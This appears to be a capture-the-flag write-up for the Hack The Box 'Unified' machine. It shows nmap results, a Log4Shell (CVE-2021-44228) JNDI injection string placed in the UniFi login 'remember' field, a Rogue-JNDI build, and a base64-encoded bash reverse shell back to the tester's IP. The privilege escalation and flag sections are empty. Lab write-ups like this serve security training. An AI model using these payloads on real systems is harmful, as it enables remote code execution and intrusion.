---

---

# Unified
---

## Geting Started
Use command to set Target IP
```bash
IP=10.129.40.113 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sC -sV -v $IP | copy 
```

Notes
```bash
-sC: Performs a script scan using the default set of scripts. It is equivalent to --  
script=default.  
-sV: Version detection  
-v: Increases the verbosity level, causing Nmap to print more information about the  
scan in progress.
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 18:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:58
Completed NSE at 18:58, 0.00s elapsed
Initiating NSE at 18:58
Completed NSE at 18:58, 0.00s elapsed
Initiating NSE at 18:58
Completed NSE at 18:58, 0.00s elapsed
Initiating Ping Scan at 18:58
Scanning 10.129.185.116 [2 ports]
Completed Ping Scan at 18:58, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:58
Completed Parallel DNS resolution of 1 host. at 18:58, 0.00s elapsed
Initiating Connect Scan at 18:58
Scanning 10.129.185.116 [1000 ports]
Discovered open port 22/tcp on 10.129.185.116
Discovered open port 8080/tcp on 10.129.185.116
Discovered open port 6789/tcp on 10.129.185.116
Discovered open port 8443/tcp on 10.129.185.116
Completed Connect Scan at 18:58, 0.47s elapsed (1000 total ports)
Initiating Service scan at 18:58
Scanning 4 services on 10.129.185.116
Completed Service scan at 19:00, 152.46s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.185.116.
Initiating NSE at 19:00
Completed NSE at 19:00, 3.71s elapsed
Initiating NSE at 19:00
Completed NSE at 19:00, 1.01s elapsed
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Nmap scan report for 10.129.185.116
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Wed, 28 Sep 2022 22:58:12 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Wed, 28 Sep 2022 22:58:12 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 28 Sep 2022 22:58:12 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.185.116:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be 8c03 5e12 6827 d1fe 612d dc76 a919
|_SHA-1: 111b aa11 9cca 4401 7cec 6e03 dc45 5cfe 65f6 d829
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=9/28%Time=6334D182%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2028\x20Sep\x202022\x
SF:2022:58:12\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Wed,\x2028\x20Sep\x202022\x2022:58:12\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Wed,\x2028\x20Sep\x202022\
SF:x2022:58:12\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Wed,\x2028\x20Sep\x202
SF:022\x2022:58:12\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Wed,\x2028\x20Sep\x202022\x2022:5
SF:8:12\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Initiating NSE at 19:00
Completed NSE at 19:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.01 seconds

```
---
### WEBSITE ENUM
---
Navigate to 10.129.40.113:8080 on firefox.

Redirected to 

```
https://10.129.40.113:8443/manage/account/login?redirect=%2Fmanage
```

See Uniif login page

![[Pasted image 20220929062258.png]]

Google 
```
UniFy 6.4.54 exploit
```

Find [Another Log4j on the fire: Unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)

It discuses [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

Additional resource [What’s Going on With Log4j?](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)

Open [BurpSuite](obsidian://open?vault=OSCP&file=TOOLS%2FBurp%20Suite%2FHow-to) and try out FoxProxy plugin.

Enable proxy and wait for results

---
## Foothold
---
Login into site with test:test to capture POST
>![[Pasted image 20220929063923.png]]

We input the payload into the remember field as shown above so that we can identify an injection point if  one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable.

```bash
${jndi:ldap://10.10.15.168/whatever}
```

>**JNDI** is the acronym for the **Java Naming and Directory Interface API** . By making calls to this API,  applications locate resources and other program objects. A resource is a program object that provides  connections to systems, such as database servers and messaging systems.  

>**LDAP** is the acronym for **Lightweight Directory Access Protocol** , which is an open, vendor-neutral,  industry standard application protocol for accessing and maintaining distributed directory information  services over the Internet or a Network. The default port that LDAP runs on is port 389 .

Highlight POSH in the Target tab under history. Press `CTRL+R` and move to the repeater tab and place payload in the remember field.

Hit Send and start tcp dump on port 389.

>tcpdump is a data-network packet analyzer computer program that runs under a command  line interface. It allows the user to display TCP/IP and other packets being  transmitted or received over a network to which the computer is attached.

Open up another terminal and type:
```bash
sudo tcpdump -i tun0 port 389
```

The above syntax can be broken down as follows.

```bash
sudo: Run this via root also known as admin.  

tcpdump: Is the program or software that is Wireshark except, it's a command line  
version.

-i: Selecting interface. (Example eth0, wlan, tun0)  

port 389: Selecting the port we are listening on.
```

Send Post again

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:55:11.388867 IP 10.129.40.113.35062 > 10.10.15.168.ldap: Flags [S], seq 516241217, win 64240, options [mss 1337,sackOK,TS val 909877810 ecr 0,nop,wscale 7], length 0
06:55:11.388877 IP 10.10.15.168.ldap > 10.129.40.113.35062: Flags [R.], seq 0, ack 516241218, win 0, length 0

```

Install Open-JDK and Maven on our system in order to build a payload that we can send to  
the server and will give us Remote Code Execution on the vulnerable system.

```bash
Sudo apt update
sudo apt install openjdk-11-jk -y
java -version
```

```bash
sudo apt-get install maven
```

Installed the required packages, we now need to download and build the Rogue-JNDI Java application.

```bash
git clone https://github.com/veracode-research/rogue-jndi  
cd rogue-jndi  
mvn package
```

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding  issues.

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.15.168/4444 0>&1' | base64
```

```bash
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==
```

After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of  the ``--command`` option and your ``tun0 IP`` address to the ``--hostname`` option

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==}| {base64,-d}|{bash,-i}" --hostname "10.10.15.168"

java -jar target/RogueJndi-1.1.jar --command "bash -c  
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY4LzQ0NDQgMD4mMQo==}|{base64,-  
d}|{bash,-i}" --hostname "10.10.15.168"
```
---

## Privilege Escalation
## Flags
user.text
```bash

```

root.txt
```

```


## Tags
#cve